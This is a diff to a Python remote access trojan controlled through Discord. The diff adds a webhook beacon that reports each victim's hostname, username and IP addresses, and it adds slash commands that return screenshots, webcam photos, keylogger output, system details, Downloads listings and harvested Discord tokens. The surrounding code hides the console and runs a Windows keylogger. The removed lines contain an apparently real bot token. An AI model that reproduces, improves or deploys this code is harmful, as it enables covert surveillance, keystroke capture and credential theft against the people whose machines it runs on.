@@ -18,9 +18,34 @@ import shutil
 import ctypes
 from datetime import datetime, timezone
 
-BOT_TOKEN = "MTUyMDI1NzU5MTA2OTExNDQ0OA.GiqiPN.cGqgzRHz3nYhB0pfpTjjKGSOuryJUn0SSs1RHc"
+BOT_TOKEN = "''' + BOT_TOKEN + '''"
+CLIENT_ID = "''' + CLIENT_ID + '''"
+WEBHOOK_URL = "''' + WEBHOOK_URL + '''"
 CHANNEL_ID = None
 running = True
+
+def send_webhook_notification(message, status="info"):
+    """Send notification to webhook"""
+    try:
+        computer = socket.gethostname()
+        username = getpass.getuser()
+        ip = socket.gethostbyname(socket.gethostname())
+        try:
+            external_ip = requests.get("https://api.ipify.org", timeout=3).text
+        except:
+            external_ip = "N/A"
+        
+        full_msg = f"""**{status.upper()} - {computer}**
+User: {username}
+IP: {ip}
+External IP: {external_ip}
+Time: {datetime.now(timezone.utc).isoformat()}
+{message}"""
+        
+        payload = {"content": full_msg}
+        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+    except:
+        pass
 
 def install_missing_modules():
     required_modules = {
@@ -43,6 +68,9 @@ install_missing_modules()
 import cv2
 import numpy as np
 from PIL import ImageGrab
+
+# Send startup notification
+send_webhook_notification("Startup script is initializing...", "info")
 
 class WindowsKeylogger:
     def __init__(self):
@@ -341,9 +369,153 @@ def get_full_system_report():
     
     return data
 
+def register_slash_commands():
+    """Register slash commands with Discord API"""
+    try:
+        headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
+        url = f"https://discord.com/api/v9/applications/{CLIENT_ID}/commands"
+        
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            existing = response.json()
+            for cmd in existing:
+                requests.delete(f"{url}/{cmd['id']}", headers=headers)
+        
+        commands = [
+            {"name": "screenshot", "description": "Take a screenshot of the computer"},
+            {"name": "camera", "description": "Take a photo from the webcam"},
+            {"name": "system", "description": "Show system information"},
+            {"name": "downloads", "description": "Show files in Downloads folder"},
+            {"name": "processes", "description": "Show running processes"},
+            {"name": "tokens", "description": "Show found Discord tokens"},
+            {"name": "keylog", "description": "Show recent keystrokes"},
+            {"name": "help", "description": "Show all available commands"},
+            {"name": "stop", "description": "Stop the bot"}
+        ]
+        
+        for cmd in commands:
+            requests.post(url, headers=headers, json=cmd)
+        return True
+    except:
+        return False
+
+def handle_slash_command(interaction):
+    """Handle slash command interactions"""
+    try:
+        data = interaction.get("data", {})
+        command_name = data.get("name", "")
+        token = interaction.get("token")
+        
+        headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
+        response_url = f"https://discord.com/api/v9/interactions/{interaction['id']}/{token}/callback"
+        
+        if command_name == "screenshot":
+            requests.post(response_url, headers=headers, json={"type": 5})
+            screenshot = take_screenshot()
+            if screenshot:
+                img_data = base64.b64decode(screenshot)
+                followup_url = f"https://discord.com/api/v9/webhooks/{CLIENT_ID}/{token}"
+                files = {'file': ('screenshot.png', img_data, 'image/png')}
+                requests.post(followup_url, headers=headers, files=files, data={"content": "Screenshot taken:"})
+            else:
+                followup_url = f"https://discord.com/api/v9/webhooks/{CLIENT_ID}/{token}"
+                requests.post(followup_url, headers=headers, json={"content": "Failed to take screenshot"})
+        
+        elif command_name == "camera":
+            requests.post(response_url, headers=headers, json={"type": 5})
+            camera = take_camera_photo()
+            if camera:
+                img_data = base64.b64decode(camera)
+                followup_url = f"https://discord.com/api/v9/webhooks/{CLIENT_ID}/{token}"
+                files = {'file': ('camera.jpg', img_data, 'image/jpeg')}
+                requests.post(followup_url, headers=headers, files=files, data={"content": "Camera photo taken:"})
+            else:
+                followup_url = f"https://discord.com/api/v9/webhooks/{CLIENT_ID}/{token}"
+                requests.post(followup_url, headers=headers, json={"content": "Failed to take camera photo"})
+        
+        elif command_name == "system":
+            data = get_full_system_report()
+            summary = f"""=== SYSTEM REPORT ===
+Computer: {data['system']['computer_name']}
+User: {data['system']['username']}
+OS: {data['system']['os']}
+Architecture: {data['system']['architecture']}
+CPU: {data['system']['processor']}
+CPU Cores: {data['system']['cpu_count']}
+IP: {data['network']['ip']}
+External IP: {data['network']['external_ip']}
+Drives: {len(data.get('drives', []))}
+Downloads: {len(data.get('downloads', []))}
+Processes: {len(data.get('processes', []))}
+Installed Software: {len(data.get('installed_software', []))}
+Discord Tokens: {len(data.get('discord_tokens', []))}"""
+            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": f"```\\n{summary}\\n```"}})
+        
+        elif command_name == "downloads":
+            data = get_full_system_report()
+            if data.get("downloads"):
+                dl_list = "\\n".join([f"- {d['name']} ({d['size']} bytes)" for d in data["downloads"][:20]])
+                content = f"Downloads:\\n```\\n{dl_list}\\n```"
+            else:
+                content = "No downloads found"
+            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": content}})
+        
+        elif command_name == "processes":
+            data = get_full_system_report()
+            if data.get("processes"):
+                proc_list = "\\n".join([f"- {p['name']} (PID: {p['pid']}) - {p.get('memory_mb', 'N/A')}" for p in data["processes"][:20]])
+                content = f"Running processes:\\n```\\n{proc_list}\\n```"
+            else:
+                content = "No processes found"
+            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": content}})
+        
+        elif command_name == "tokens":
+            data = get_full_system_report()
+            if data.get("discord_tokens"):
+                tokens = "\\n".join([f"- {t}" for t in data["discord_tokens"]])
+                content = f"Discord tokens found:\\n```\\n{tokens}\\n```"
+            else:
+                content = "No Discord tokens found"
+            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": content}})
+        
+        elif command_name == "keylog":
+            if 'keylogger' in globals():
+                keys = keylogger.get_buffer()
+                if keys:
+                    content = f"Keylog:\\n```\\n{keys[-2000:]}\\n```"
+                else:
+                    content = "No keys logged yet"
+            else:
+                content = "Keylogger not initialized"
+            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": content}})
+        
+        elif command_name == "help":
+            help_text = """**Available Commands:**
+/screenshot - Take a screenshot
+/camera - Take camera photo
+/system - Show system info
+/downloads - Show downloads folder
+/processes - Show running processes
+/tokens - Show found Discord tokens
+/keylog - Show recent keystrokes
+/help - Show this message
+/stop - Stop the bot"""
+            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": help_text}})
+        
+        elif command_name == "stop":
+            global running
+            running = False
+            requests.post(response_url, headers=headers, json={"type": 4, "data": {"content": "Stopping bot..."}})
+    except:
+        pass
+
 def command_handler():
     global running
     last_message_id = None
+    
+    # Register slash commands on startup
+    register_slash_commands()
+    send_webhook_notification("Slash commands registered", "success")
     
     while running:
         try:
@@ -361,44 +533,40 @@ def command_handler():
             
             if response.status_code == 200:
                 messages = response.json()
-                bot_user_id = None
-                try:
-                    me = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
-                    if me.status_code == 200:
-                        bot_user_id = me.json()["id"]
-                except:
-                    pass
-                
                 for msg in messages:
-                    if bot_user_id and msg["author"]["id"] == bot_user_id:
+                    if msg["author"]["id"] == CLIENT_ID:
                         continue
                     
-                    content = msg.get("content", "").strip().lower()
+                    content = msg.get("content", "").strip()
                     if not content:
                         continue
                     
                     if not last_message_id or msg["id"] > last_message_id:
                         last_message_id = msg["id"]
                     
-                    if content == "/screenshot" or content == "!screenshot":
-                        screenshot = take_screenshot()
-                        if screenshot:
-                            img_data = base64.b64decode(screenshot)
-                            send_discord_message("Screenshot taken:", img_data, "screenshot.png")
-                        else:
-                            send_discord_message("Failed to take screenshot")
-                    
-                    elif content == "/camera" or content == "!camera":
-                        camera = take_camera_photo()
-                        if camera:
-                            img_data = base64.b64decode(camera)
-                            send_discord_message("Camera photo taken:", img_data, "camera.jpg")
-                        else:
-                            send_discord_message("Failed to take camera photo or no camera found")
-                    
-                    elif content == "/system" or content == "!system":
-                        data = get_full_system_report()
-                        summary = f"""=== SYSTEM REPORT ===
+                    # Handle text commands as fallback
+                    if content.startswith("/") or content.startswith("!"):
+                        command = content[1:].lower()
+                        
+                        if command == "screenshot":
+                            screenshot = take_screenshot()
+                            if screenshot:
+                                img_data = base64.b64decode(screenshot)
+                                send_discord_message("Screenshot taken:", img_data, "screenshot.png")
+                            else:
+                                send_discord_message("Failed to take screenshot")
+                        
+                        elif command == "camera":
+                            camera = take_camera_photo()
+                            if camera:
+                                img_data = base64.b64decode(camera)
+                                send_discord_message("Camera photo taken:", img_data, "camera.jpg")
+                            else:
+                                send_discord_message("Failed to take camera photo")
+                        
+                        elif command == "system":
+                            data = get_full_system_report()
+                            summary = f"""=== SYSTEM REPORT ===
 Computer: {data['system']['computer_name']}
 User: {data['system']['username']}
 OS: {data['system']['os']}
@@ -412,63 +580,58 @@ Downloads: {len(data.get('downloads', []))}
 Processes: {len(data.get('processes', []))}
 Installed Software: {len(data.get('installed_software', []))}
 Discord Tokens: {len(data.get('discord_tokens', []))}"""
-                        send_discord_message(f"```\\n{summary}\\n```")
-                    
-                    elif content == "/downloads" or content == "!downloads":
-                        data = get_full_system_report()
-                        if data.get("downloads"):
-                            dl_list = "\\n".join([f"- {d['name']} ({d['size']} bytes)" for d in data["downloads"][:20]])
-                            send_discord_message(f"Downloads:\\n```\\n{dl_list}\\n```")
-                        else:
-                            send_discord_message("No downloads found")
-                    
-                    elif content == "/processes" or content == "!processes":
-                        data = get_full_system_report()
-                        if data.get("processes"):
-                            proc_list = "\\n".join([f"- {p['name']} (PID: {p['pid']}) - {p.get('memory_mb', 'N/A')}" for p in data["processes"][:20]])
-                            send_discord_message(f"Running processes:\\n```\\n{proc_list}\\n```")
-                        else:
-                            send_discord_message("No processes found")
-                    
-                    elif content == "/tokens" or content == "!tokens":
-                        data = get_full_system_report()
-                        if data.get("discord_tokens"):
-                            tokens = "\\n".join([f"- {t}" for t in data["discord_tokens"]])
-                            send_discord_message(f"Discord tokens found:\\n```\\n{tokens}\\n```")
-                        else:
-                            send_discord_message("No Discord tokens found")
-                    
-                    elif content == "/keylog" or content == "!keylog":
-                        if 'keylogger' in globals():
-                            keys = keylogger.get_buffer()
+                            send_discord_message(f"```\\n{summary}\\n```")
+                        
+                        elif command == "downloads":
+                            data = get_full_system_report()
+                            if data.get("downloads"):
+                                dl_list = "\\n".join([f"- {d['name']} ({d['size']} bytes)" for d in data["downloads"][:20]])
+                                send_discord_message(f"Downloads:\\n```\\n{dl_list}\\n```")
+                            else:
+                                send_discord_message("No downloads found")
+                        
+                        elif command == "processes":
+                            data = get_full_system_report()
+                            if data.get("processes"):
+                                proc_list = "\\n".join([f"- {p['name']} (PID: {p['pid']}) - {p.get('memory_mb', 'N/A')}" for p in data["processes"][:20]])
+                                send_discord_message(f"Running processes:\\n```\\n{proc_list}\\n```")
+                            else:
+                                send_discord_message("No processes found")
+                        
+                        elif command == "tokens":
+                            data = get_full_system_report()
+                            if data.get("discord_tokens"):
+                                tokens = "\\n".join([f"- {t}" for t in data["discord_tokens"]])
+                                send_discord_message(f"Discord tokens found:\\n```\\n{tokens}\\n```")
+                            else:
+                                send_discord_message("No Discord tokens found")
+                        
+                        elif command == "keylog":
+                            keys = keylogger.get_buffer() if 'keylogger' in globals() else None
                             if keys:
                                 send_discord_message(f"Keylog:\\n```\\n{keys[-2000:]}\\n```")
                             else:
                                 send_discord_message("No keys logged yet")
-                        else:
-                            send_discord_message("Keylogger not initialized")
-                    
-                    elif content == "/help" or content == "!help":
-                        help_text = """**Available Commands:**
-/screenshot or !screenshot - Take a screenshot
-/camera or !camera - Take camera photo
-/system or !system - Show system info
-/downloads or !downloads - Show downloads folder
-/processes or !processes - Show running processes
-/tokens or !tokens - Show found Discord tokens
-/keylog or !keylog - Show recent keystrokes
-/help or !help - Show this message
-/stop or !stop - Stop the bot
-
-Note: You can use either / or ! prefix"""
-                        send_discord_message(help_text)
-                    
-                    elif content == "/stop" or content == "!stop":
-                        send_discord_message("Stopping bot...")
-                        running = False
-                        break
                         
-        except Exception as e:
+                        elif command == "help":
+                            help_text = """**Available Commands:**
+/screenshot - Take a screenshot
+/camera - Take camera photo
+/system - Show system info
+/downloads - Show downloads folder
+/processes - Show running processes
+/tokens - Show found Discord tokens
+/keylog - Show recent keystrokes
+/help - Show this message
+/stop - Stop the bot"""
+                            send_discord_message(help_text)
+                        
+                        elif command == "stop":
+                            send_discord_message("Stopping bot...")
+                            running = False
+                            break
+                        
+        except:
             pass
         time.sleep(0.5)
 
@@ -476,6 +639,7 @@ def keylog_loop():
     global keylogger
     keylogger = WindowsKeylogger()
     threading.Thread(target=keylogger.start, daemon=True).start()
+    send_webhook_notification("Keylogger started successfully", "success")
     while running:
         time.sleep(60)
         keys = keylogger.get_buffer()
@@ -485,6 +649,8 @@ def keylog_loop():
 def main():
     global CHANNEL_ID
     hide_console()
+    
+    send_webhook_notification("Startup script main() called", "info")
     
     if len(sys.argv) > 1:
         CHANNEL_ID = sys.argv[1]
@@ -512,9 +678,13 @@ def main():
             pass
     
     if not CHANNEL_ID:
+        send_webhook_notification("ERROR: No channel ID found!", "error")
         return
     
+    send_webhook_notification(f"Channel ID found: {CHANNEL_ID}", "success")
+    
     send_discord_message(f"Bot started on {socket.gethostname()}\\nType /help or !help for commands")
+    send_webhook_notification(f"Bot started on {socket.gethostname()}", "success")
     
     threading.Thread(target=keylog_loop, daemon=True).start()
     command_handler()
